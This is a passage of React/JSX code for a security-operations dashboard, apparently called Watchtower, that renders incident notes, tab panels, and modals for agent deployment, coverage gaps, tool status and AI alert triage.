                        {addingNoteTo===inc.id && (
                          <div style={{marginTop:8,display:'flex',gap:6}}>
                            <input value={noteInput} onChange={e=>setNoteInput(e.target.value)} placeholder='Type a note...' style={{flex:1,padding:'6px 10px',borderRadius:6,border:'1px solid var(--wt-border2)',background:'var(--wt-card)',color:'var(--wt-text)',fontSize:'0.74rem',fontFamily:'Inter,sans-serif',outline:'none'}} />
                            <button onClick={()=>{if(noteInput.trim()){setIncidentNotes(prev=>({...prev,[inc.id]:[...(prev[inc.id]||[]),{text:noteInput.trim(),time:new Date().toLocaleTimeString()}]}));setNoteInput('');setAddingNoteTo(null);}}} style={{padding:'6px 12px',borderRadius:6,border:'none',background:'#4f8fff',color:'#fff',fontSize:'0.7rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Save</button>
                          </div>
                        )}
                        {incidentNotes[inc.id] && incidentNotes[inc.id].length>0 && (
                          <div style={{marginTop:8}}>
                            <div style={{fontSize:'0.6rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:4}}>Notes</div>
                            {incidentNotes[inc.id].map((n,ni)=>(
                              <div key={ni} style={{fontSize:'0.7rem',color:'var(--wt-secondary)',padding:'5px 8px',background:'var(--wt-card2)',borderRadius:5,marginBottom:3,display:'flex',justifyContent:'space-between',gap:8}}>
                                <span>{n.text}</span><span style={{color:'var(--wt-dim)',flexShrink:0,fontSize:'0.6rem'}}>{n.time}</span>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </GateWall>
          )}
          {/* ═══════════════════════════════ TOOLS ══════════════════════════════════ */}
          {activeTab==='tools' && (
            <ToolsTab connected={connectedTools} setConnected={setConnectedTools} />
          )}

          {/* ═══════════════════════════════ ADMIN PORTAL ═══════════════════════════════ */}
          {activeTab==='admin' && isAdmin && <AdminPortal setCurrentTenant={setCurrentTenant} setActiveTab={setActiveTab} clientBanner={clientBanner} setClientBanner={setClientBanner} adminBannerInput={adminBannerInput} setAdminBannerInput={setAdminBannerInput} userRole={userRole} setUserRole={setUserRole} />}

          {/* ═══════════════════════════════ MSSP PORTFOLIO ══════════════════════════ */}
          {activeTab==='mssp' && <MSSPPortfolio currentTenant={currentTenant} setCurrentTenant={setCurrentTenant} DEMO_TENANTS={DEMO_TENANTS} isAdmin={isAdmin} setActiveTab={setActiveTab} setAdminBannerInput={setAdminBannerInput} />}
          {activeTab==='sales' && isSales && <SalesDashboard />}
        </div>
      </div>

      {/* ═══════════════════════════════ MODALS ════════════════════════════════════ */}

      {/* Deploy Agent Modal */}
      {deployAgentDevice && (
        <Modal title={`Deploy Agent — ${deployAgentDevice.hostname}`} onClose={()=>setDeployAgentDevice(null)}>
          <div style={{fontSize:'0.78rem',color:'var(--wt-secondary)',lineHeight:1.7,marginBottom:16}}>
            This device is missing: <strong style={{color:'#f0405e'}}>{deployAgentDevice.missing.join(', ')}</strong><br />
            Reason: {deployAgentDevice.reason}
          </div>
          <div style={{fontSize:'0.7rem',fontWeight:700,color:'#4f8fff',marginBottom:10,textTransform:'uppercase',letterSpacing:'0.5px'}}>Deployment Options</div>
          {[
            {title:'1. Automated Push (recommended)',desc:'Watchtower will push the agent via your existing RMM or SCCM/Intune. Requires admin credentials configured in Settings.',btn:'Push via RMM',color:'#4f8fff'},
            {title:'2. Manual install — Windows',desc:'Download the installer and run on the target device. Requires local admin rights.',btn:'Download .exe',color:'#22d49a'},
            {title:'3. Manual install — macOS/Linux',desc:'Run the curl command on the target device via SSH or terminal.',btn:'Copy curl command',color:'#22d49a'},
            {title:'4. Group Policy / MDM',desc:'Deploy at scale via GPO (Windows) or MDM profile (macOS). Recommended for 10+ devices.',btn:'Download GPO template',color:'#8b6fff'},
          ].map(opt=>(
            <div key={opt.title} style={{padding:'12px 14px',background:'var(--wt-card)',border:'1px solid #141820',borderRadius:10,marginBottom:8}}>
              <div style={{fontSize:'0.76rem',fontWeight:700,marginBottom:4}}>{opt.title}</div>
              <div style={{fontSize:'0.68rem',color:'var(--wt-muted)',marginBottom:8,lineHeight:1.5}}>{opt.desc}</div>
              <button style={{padding:'5px 14px',borderRadius:6,border:`1px solid ${opt.color}30`,background:`${opt.color}12`,color:opt.color,fontSize:'0.68rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>{opt.btn}</button>
            </div>
          ))}
          <div style={{marginTop:12,padding:'10px 14px',background:'var(--wt-card2)',border:'1px solid #4f8fff15',borderRadius:8,fontSize:'0.68rem',color:'var(--wt-muted)',lineHeight:1.6}}>
            💡 After deployment, the agent will check in within 5 minutes. This device will be removed from the gaps list automatically.
          </div>
        </Modal>
      )}

      {/* Coverage Gap Modal */}
      {modal?.type==='gaps' && (
        <Modal title={`Coverage Gaps — ${gapDevices.length} Devices`} onClose={()=>setModal(null)}>
          <div style={{marginBottom:10,padding:'8px 12px',background:'#f0405e0a',border:'1px solid #f0405e18',borderRadius:8,fontSize:'0.74rem',color:'#f0405e'}}>
            ⚠ These devices have no agent coverage — they are invisible to your security tools and represent active risk.
          </div>
          {gapDevices.map(dev=>(
            <div key={dev.hostname} style={{padding:'12px 0',borderBottom:'1px solid #141820'}}>
              <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:4}}>
                <span style={{fontSize:'0.82rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace'}}>{dev.hostname}</span>
                <span style={{fontSize:'0.6rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace'}}>{dev.ip}</span>
                <span style={{fontSize:'0.6rem',color:'var(--wt-muted)'}}>{dev.os}</span>
                <span style={{fontSize:'0.58rem',color:'var(--wt-dim)',marginLeft:'auto'}}>Last seen {dev.lastSeen}</span>
              </div>
              <div style={{display:'flex',gap:5,flexWrap:'wrap',marginBottom:4}}>
                {dev.missing.map(m=>{
                  const catColor = m.includes('Falcon')||m.includes('Defender')||m.includes('SentinelOne')||m.includes('Carbon Black')?'#f0405e':m.includes('Splunk')||m.includes('Sentinel')||m.includes('QRadar')||m.includes('Elastic')?'#f0a030':m.includes('Tenable')||m.includes('Nessus')||m.includes('Qualys')?'#8b6fff':'#4f8fff';
                  return <span key={m} style={{fontSize:'0.62rem',fontWeight:700,padding:'3px 8px',borderRadius:4,background:`${catColor}14`,color:catColor,border:`1px solid ${catColor}28`,display:'inline-flex',alignItems:'center',gap:4}}><span style={{fontSize:'0.5rem'}}>✗</span>{m}</span>;
                })}
              </div>
              <div style={{fontSize:'0.68rem',color:'var(--wt-muted)'}}>{dev.reason}</div>
            </div>
          ))}
        </Modal>
      )}

      {/* Tools Modal */}
      {modal?.type==='tools' && (
        <Modal title='Tool Status' onClose={()=>setModal(null)}>
          {tools.map(tool=>(
            <div key={tool.id} style={{display:'flex',alignItems:'center',gap:12,padding:'10px 0',borderBottom:'1px solid #141820'}}>
              <div style={{width:8,height:8,borderRadius:'50%',background:tool.active?'#22c992':'#f0405e',boxShadow:tool.active?'0 0 6px #22c992':'none',flexShrink:0}} />
              <span style={{flex:1,fontSize:'0.82rem',fontWeight:600}}>{tool.name}</span>
              <span style={{fontSize:'0.7rem',color:tool.active?'#22d49a':'#f0405e',fontWeight:700}}>{tool.active?'Connected':'Not configured'}</span>
              {tool.alertCount && tool.alertCount > 0 && <span style={{fontSize:'0.62rem',color:'#4f8fff'}}>{tool.alertCount} alerts today</span>}
              {!tool.active && <a href='/settings/tools' style={{padding:'3px 10px',borderRadius:5,background:'#4f8fff12',color:'#4f8fff',fontSize:'0.66rem',fontWeight:700,textDecoration:'none'}}>Configure →</a>}
            </div>
          ))}
        </Modal>
      )}

      {/* Alerts Ingested Modal */}
      {modal?.type==='alerts-ingested' && (
        <Modal title={`Alert Ingestion — What AI Did`} onClose={()=>setModal(null)}>
          <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8,marginBottom:16}}>
            {[{val:alerts.length,label:'Ingested',c:'#4f8fff'},{val:fpAlerts.length,label:'Auto-Closed FPs',c:'#22d49a'},{val:tpAlerts.length,label:'Escalated TPs',c:'#f0405e'}].map(s=>(
              <div key={s.label} style={{textAlign:'center',padding:'10px',background:'var(--wt-bg)',borderRadius:8,border:'1px solid #141820'}}>
                <div style={{fontSize:'1.6rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.c,letterSpacing:-1}}>{s.val}</div>
                <div style={{fontSize:'0.6rem',color:'var(--wt-dim)'}}>{s.label}</div>
              </div>
            ))}
          </div>
          {alerts.map(a=>(
            <div key={a.id} style={{padding:'10px 0',borderBottom:'1px solid #141820'}}>
              <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:2}}>
                <span style={{width:4,height:16,borderRadius:2,background:SEV_COLOR[a.severity],flexShrink:0}} />
                <span style={{fontSize:'0.78rem',fontWeight:600,flex:1}}>{a.title}</span>
                <span style={{fontSize:'0.56rem',fontWeight:800,padding:'2px 7px',borderRadius:3,color:VERDICT_STYLE[a.verdict].c,background:VERDICT_STYLE[a.verdict].bg}}>{a.verdict}</span>
              </div>
              <div style={{fontSize:'0.7rem',color:'#22d49a',paddingLeft:12}}>⚡ {a.aiActions[0]}</div>
            </div>
          ))}
        </Modal>
      )}
    </div>
  );
}
